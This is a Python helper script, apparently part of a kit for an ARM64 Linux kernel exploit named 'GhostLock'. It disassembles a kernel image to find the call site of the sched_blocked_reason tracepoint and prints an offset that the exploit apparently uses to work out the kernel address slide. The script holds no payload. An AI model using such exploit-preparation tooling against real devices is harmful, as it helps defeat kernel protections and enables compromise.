#!/usr/bin/env python3
"""
find-trace-caller.py -- Find the sched:sched_blocked_reason tracepoint caller
offset for the GhostLock exploit.

Run in WSL2 after converting the kernel Image to an ELF:

    vmlinux-to-elf Image vmlinux.elf
    python3 find-trace-caller.py vmlinux.elf

The printed hex value is SLIDE_TRACEFS_WORKER_CALLER_OFF.
"""
import argparse
import sys

try:
    from elftools.elf.elffile import ELFFile
    from capstone import Cs, CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN
except ImportError as e:
    print(f"[-] Missing dependency: {e}", file=sys.stderr)
    print("[-] Install: pip3 install --user pyelftools capstone", file=sys.stderr)
    sys.exit(1)

KIMAGE_TEXT_BASE = 0xFFFFFFC080000000

TRACEPOINT_CANDIDATES = [
    "trace_sched_blocked_reason",
    "__traceiter_sched_blocked_reason",
    "perf_trace_sched_blocked_reason",
]


def get_symbol_address(elf, name):
    symtab = elf.get_section_by_name(".symtab")
    if not symtab:
        return None
    syms = symtab.get_symbol_by_name(name)
    if syms:
        return syms[0]["st_value"]
    # dynamic symbol fallback
    dynsym = elf.get_section_by_name(".dynsym")
    if dynsym:
        syms = dynsym.get_symbol_by_name(name)
        if syms:
            return syms[0]["st_value"]
    return None


def get_text_section(elf):
    text = elf.get_section_by_name(".text")
    if text:
        return text["sh_addr"], text.data()

    # vmlinux-to-elf sometimes emits only segments, not sections.
    # Fall back to the first executable LOAD segment.
    for segment in elf.iter_segments():
        if segment["p_type"] == "PT_LOAD" and (segment["p_flags"] & 0x1):  # PF_X
            off = segment["p_offset"]
            size = segment["p_filesz"]
            addr = segment["p_vaddr"]
            elf.stream.seek(off)
            data = elf.stream.read(size)
            print(f"[+] Falling back to executable LOAD segment at {addr:#x}, size {size} bytes")
            return addr, data

    print("[-] No .text section or executable LOAD segment found", file=sys.stderr)
    sys.exit(1)


def find_trace_caller(elf_path, kimage_text_base):
    f = open(elf_path, "rb")
    elf = ELFFile(f)

    try:
        text_addr, text_data = get_text_section(elf)
        print(f"[+] .text at {text_addr:#x}, size {len(text_data)} bytes")

        trace_addr = None
        found_name = None
        for name in TRACEPOINT_CANDIDATES:
            addr = get_symbol_address(elf, name)
            if addr:
                trace_addr = addr
                found_name = name
                print(f"[+] Found {name} at {addr:#x}")
                break

        if trace_addr is None:
            print("[-] Could not find tracepoint symbol.", file=sys.stderr)
            print("[-] Candidates: " + ", ".join(TRACEPOINT_CANDIDATES), file=sys.stderr)
            sys.exit(1)

        md = Cs(CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN)
        md.detail = True

        hits = []
        for insn in md.disasm(text_data, text_addr):
            if insn.mnemonic != "bl":
                continue
            try:
                target = int(insn.op_str, 16)
            except ValueError:
                continue
            if target == trace_addr:
                caller = insn.address + 4
                offset = caller - kimage_text_base
                hits.append((caller, offset))
                print(f"[+] bl {found_name} from {insn.address:#x}")
                print(f"    caller address = {caller:#x}")
                print(f"    SLIDE_TRACEFS_WORKER_CALLER_OFF = {offset:#x}")

        if not hits:
            print("[-] No bl instruction to tracepoint found in .text", file=sys.stderr)
            sys.exit(1)

        if len(hits) > 1:
            print("[!] Multiple call sites found; the first is usually the one used.")

        return hits[0][1]
    finally:
        f.close()


def main():
    parser = argparse.ArgumentParser(
        description="Find sched_blocked_reason tracepoint caller offset"
    )
    parser.add_argument("elf", help="path to vmlinux.elf")
    parser.add_argument(
        "--text-base",
        type=lambda x: int(x, 0),
        default=KIMAGE_TEXT_BASE,
        help=f"KIMAGE_TEXT_BASE (default: {KIMAGE_TEXT_BASE:#x})",
    )
    args = parser.parse_args()

    off = find_trace_caller(args.elf, args.text_base)
    print(f"\n[+] Use this in target.h:\n    #define SLIDE_TRACEFS_WORKER_CALLER_OFF  {off:#x}ULL")


if __name__ == "__main__":
    main()
